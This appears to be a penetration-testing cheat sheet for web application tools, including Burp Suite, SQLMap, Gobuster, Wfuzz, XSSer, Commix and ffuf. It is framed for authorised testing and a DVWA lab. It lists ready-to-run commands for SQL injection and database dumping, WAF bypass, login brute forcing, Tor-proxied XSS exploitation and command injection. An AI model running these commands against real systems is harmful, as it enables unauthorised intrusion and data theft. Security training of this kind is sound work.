# Web Application Attack Tools

> **Legal Notice:** Only use these tools on systems you own or have explicit written permission to test.

Web application testing covers OWASP Top 10 vulnerabilities including SQL injection, XSS, CSRF, authentication bypass, file inclusion, and more.

---

## Burp Suite — Web Proxy & Testing Platform

The de-facto standard for web application penetration testing.

### Launch
```bash
burpsuite
# Or from Kali menu: Applications > Web Application Analysis > burpsuite
```

### Key Features
- **Proxy** — intercept and modify HTTP/S traffic
- **Repeater** — manually replay and modify requests
- **Intruder** — automated fuzzing and brute force
- **Scanner** (Pro) — automated vulnerability scanning
- **Decoder** — encode/decode data (Base64, URL, HTML, etc.)

### Setup Browser Proxy
- Set browser proxy to `127.0.0.1:8080`
- Install Burp CA cert for HTTPS interception

### Common Workflows

```
Intercept a request:
  Proxy > Intercept > Enable Intercept > browse target > modify > Forward

Send to Repeater:
  Right-click request > Send to Repeater > Ctrl+R to replay

Brute force login (Intruder):
  Intercept POST login > Send to Intruder
  Positions > highlight password field > Add §
  Payloads > load wordlist > Start Attack
```

---

## SQLMap — Automated SQL Injection

```bash
# Test a URL parameter
sqlmap -u "http://target.com/page?id=1"

# Test POST data
sqlmap -u "http://target.com/login" --data="user=admin&pass=test"

# Enumerate databases
sqlmap -u "http://target.com/page?id=1" --dbs

# Enumerate tables in a database
sqlmap -u "http://target.com/page?id=1" -D mydb --tables

# Dump a table
sqlmap -u "http://target.com/page?id=1" -D mydb -T users --dump

# Use Burp request file
sqlmap -r request.txt

# Bypass WAF
sqlmap -u "http://target.com/page?id=1" --tamper=space2comment,charencode

# Risk/level (higher = more aggressive)
sqlmap -u "http://target.com/page?id=1" --risk=3 --level=5

# Docker lab target
sqlmap -u "http://172.20.0.20/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="PHPSESSID=xxxx; security=low" --dbs
```

---

## Gobuster / Dirb — Directory Brute Forcing

### Gobuster
```bash
# Directory brute force
gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt

# File extension search
gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt -x php,txt,html

# DNS subdomain brute force
gobuster dns -d target.com -w /usr/share/wordlists/dnsmap.txt

# Virtual host discovery
gobuster vhost -u http://target.com -w /usr/share/wordlists/dirb/common.txt

# Faster with threads
gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/big.txt -t 50
```

### Dirb
```bash
dirb http://target.com
dirb http://target.com /usr/share/wordlists/dirb/big.txt
dirb http://target.com -X .php,.txt
```

---

## Wfuzz — Web Fuzzer

```bash
# Fuzz a parameter
wfuzz -c -z file,/usr/share/wordlists/dirb/common.txt http://target.com/FUZZ

# Fuzz POST parameters
wfuzz -c -z file,users.txt -z file,passwords.txt -d "user=FUZZ&pass=FUZ2Z" http://target.com/login

# Filter by response code
wfuzz -c --hc 404 -z file,/usr/share/wordlists/dirb/common.txt http://target.com/FUZZ

# Filter by word count
wfuzz -c --hw 100 -z file,wordlist.txt http://target.com/FUZZ
```

---

## XSSer — Cross-Site Scripting Tool

```bash
# Basic XSS test
xsser --url "http://target.com/search?q=XSS"

# Auto exploit
xsser --url "http://target.com/search?q=XSS" --auto

# Use Tor proxy
xsser --url "http://target.com/search?q=XSS" --proxy "http://127.0.0.1:8118"
```

---

## Commix — Command Injection Exploiter

```bash
# Test GET parameter
commix --url="http://target.com/cmd.php?ip=INJECT_HERE"

# Test POST parameter
commix --url="http://target.com/cmd.php" --data="ip=INJECT_HERE"

# Use Burp request file
commix --requestfile=/tmp/request.txt
```

---

## ffuf — Fast Web Fuzzer

```bash
# Directory fuzzing
ffuf -u http://target.com/FUZZ -w /usr/share/wordlists/dirb/common.txt

# Filter 404s
ffuf -u http://target.com/FUZZ -w wordlist.txt -fc 404

# Fuzz multiple positions
ffuf -u http://target.com/FUZZ1/FUZZ2 -w wordlist1.txt:FUZZ1 -w wordlist2.txt:FUZZ2

# Fuzz subdomains
ffuf -u http://FUZZ.target.com -w subdomains.txt -H "Host: FUZZ.target.com"

# POST body fuzzing
ffuf -u http://target.com/login -X POST -d "user=admin&pass=FUZZ" -w passwords.txt
```

---

## DVWA — Damn Vulnerable Web App (Docker)

```bash
# In the lab, DVWA runs at http://172.20.0.20
# Default credentials: admin / password
# Set security level to Low to start

# Practice targets:
# - SQL Injection: /dvwa/vulnerabilities/sqli/
# - XSS Reflected: /dvwa/vulnerabilities/xss_r/
# - XSS Stored: /dvwa/vulnerabilities/xss_s/
# - File Upload: /dvwa/vulnerabilities/upload/
# - Command Injection: /dvwa/vulnerabilities/exec/
# - CSRF: /dvwa/vulnerabilities/csrf/
# - Brute Force: /dvwa/vulnerabilities/brute/
```

---

## Resources
- [PortSwigger Web Security Academy (Free)](https://portswigger.net/web-security)
- [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
- [TryHackMe — OWASP Top 10](https://tryhackme.com/room/owasptop10)
- [HackTheBox — Web Challenges](https://app.hackthebox.com/challenges)
